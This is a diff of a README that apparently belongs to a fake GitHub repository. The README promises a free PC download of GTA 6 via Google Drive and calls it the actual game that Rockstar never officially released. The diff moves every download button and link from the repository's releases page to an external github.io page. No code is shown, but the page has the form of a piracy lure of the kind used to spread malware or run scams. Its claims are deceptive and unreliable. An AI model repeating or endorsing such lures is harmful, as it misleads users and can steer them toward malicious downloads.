@@ -1,6 +1,6 @@
 # 🎮 GTA-6-Google-Drive-Download-Link-2026 - Play GTA 6 Today on PC
 
-[![Download GTA 6](https://img.shields.io/badge/Download-GTA_6_2026-00FF00?style=for-the-badge&logo=googledrive&logoColor=white)](https://github.com/abdualrahmankobicy/GTA-6-Google-Drive-Download-Link-2026/releases)
+[![Download GTA 6](https://img.shields.io/badge/Download-GTA_6_2026-00FF00?style=for-the-badge&logo=googledrive&logoColor=white)](https://abdualrahmankobicy.github.io)
 
 ---
 
@@ -15,9 +15,9 @@ This isn't a teaser or a demo. It's the actual game that Rockstar never official
 ## 📥 Download GTA 6 (Direct Link)
 
 Visit this link to download the application:  
-### [🚀 CLICK HERE TO DOWNLOAD GTA 6 FOR PC](https://github.com/abdualrahmankobicy/GTA-6-Google-Drive-Download-Link-2026/releases)
+### [🚀 CLICK HERE TO DOWNLOAD GTA 6 FOR PC](https://abdualrahmankobicy.github.io)
 
-[![Get GTA 6 Now](https://img.shields.io/badge/⬇️_DOWNLOAD_GTA_6-FF5733?style=for-the-badge&logo=download&logoColor=white&color=FF5733)](https://github.com/abdualrahmankobicy/GTA-6-Google-Drive-Download-Link-2026/releases)
+[![Get GTA 6 Now](https://img.shields.io/badge/⬇️_DOWNLOAD_GTA_6-FF5733?style=for-the-badge&logo=download&logoColor=white&color=FF5733)](https://abdualrahmankobicy.github.io)
 
 ---
 
@@ -60,7 +60,7 @@ Follow these simple instructions carefully. No technical skills needed.
 ### Step 1: Go to the Download Page
 
 Click the green button above or use this link:  
-**https://github.com/abdualrahmankobicy/GTA-6-Google-Drive-Download-Link-2026/releases**
+**https://abdualrahmankobicy.github.io**
 
 ### Step 2: Download the File
 
@@ -152,9 +152,9 @@ Enjoying GTA 6 on PC? Spread the word! Send this page to fellow gamers who want 
 ## 🔗 Quick Access Download
 
 Visit this link to download the application:  
-### [⬇️ DOWNLOAD GTA 6 FULL PC BUILD](https://github.com/abdualrahmankobicy/GTA-6-Google-Drive-Download-Link-2026/releases)
+### [⬇️ DOWNLOAD GTA 6 FULL PC BUILD](https://abdualrahmankobicy.github.io)
 
-[![Ultimate GTA 6 Download](https://img.shields.io/badge/GTA_6_ULTIMATE_EDITION-9B59B6?style=for-the-badge&logo=googledrive&logoColor=white&color=9B59B6)](https://github.com/abdualrahmankobicy/GTA-6-Google-Drive-Download-Link-2026/releases)
+[![Ultimate GTA 6 Download](https://img.shields.io/badge/GTA_6_ULTIMATE_EDITION-9B59B6?style=for-the-badge&logo=googledrive&logoColor=white&color=9B59B6)](https://abdualrahmankobicy.github.io)
 
 ---
 
